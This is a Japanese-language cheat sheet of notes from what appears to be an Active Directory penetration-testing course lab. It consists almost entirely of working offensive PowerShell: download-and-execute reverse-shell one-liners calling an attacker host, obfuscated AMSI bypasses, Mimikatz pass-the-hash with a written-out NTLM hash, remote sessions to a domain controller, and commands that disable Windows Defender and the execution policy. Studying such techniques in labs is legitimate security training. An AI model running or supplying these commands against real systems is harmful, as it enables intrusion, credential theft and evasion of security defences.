## ReverseShell
- 場合によってFireWallを無効化する必要がある。
```
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/InvokePowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.X -Port 443

or

powershell.exe iex (iwr -UseBasicParsing http://172.16.100.X/Invoke-PowerShellTcp.ps1);Power -Reverse -IPAddress 172.16.100.X -Port 443
```

---
## AMSI Bypass
```
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

- ほかのやりかった
```
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
$d=$c.GetFields("NonPublic,Static")
Foreach($e in $d) {if ($e.Name -like "*nitFail*") {$f=$e}}
$f.SetValue($null,$true)
```

---
## ArgSplit.bat
エンコードをしてcmdにコピペをする。

---
## Import-Module(?)
```
PS C:\Windows\system32> . C:\AD\Tools\Invoke-Mimi.ps1 
```
---
## $sess = New-PSSession -ComputerName dcorp-dc
CLIベースでほかの端末にアクセスできるコマンドである。
ただ前提として以下のようにしてscvadminでcmdを立ち上げる必要がある。
```
C:\Windows\System32> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat 
[snip] 
C:\Windows\System32>. C:\AD\Tools\Invoke-Mimi.ps1 
C:\Windows\System32> Invoke-Mimi -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:cmd.exe"' 
[snip] 
```
で、新しく立ち上がったコマンドプロンプト上で以下のコマンドを実行すれば成功するはず。
```
PS C:\AD\Tools> $sess = New-PSSession -ComputerName dcorp-dc 
PS C:\AD\Tools> Enter-PSSession $sess
```
---
## Defender無効化
以下のコマンドはWindows Defenderのリアルタイム保護を無効化する。
```
[dcorp-adminsrv]: PS C:\Users\studentx\Documents> Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
VERBOSE: Performing operation 'Update MSFT_MpPreference' on Target 
'ProtectionManagement'.
```
- Set-MpPrefernce:WindowsDefenderの設定を変更するためのコマンド
- **-DisableRealtimeMonitoring**:リアルタイム保護を無効にするオプション。
	- $trueは無効化にする。
	- $falseは有効化する。
---
## Powershell Script Bypass
```
PS C:\WINDOWS\system32> powershell -ep bypass 
```